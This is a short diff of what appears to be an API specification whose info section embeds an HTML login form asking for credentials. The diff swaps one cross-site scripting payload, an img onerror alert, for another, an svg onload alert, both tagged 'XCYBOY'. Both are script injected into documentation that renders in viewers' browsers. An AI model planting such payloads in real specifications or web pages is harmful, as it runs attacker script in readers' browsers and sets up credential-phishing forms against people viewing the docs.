@@ -7,7 +7,7 @@ info:
     <div class="login-form">
       <h2 style="text-align:center;">Login Page</h2>
       <p style="text-align:center; color: #888;">Please enter your credentials to continue.</p>
-      <img src="x" onerror="alert('XCYBOY XSS')">
+       <svg/onload=alert`'XCYBOY'`>
     </div>
 host: example.com
 basePath: /api
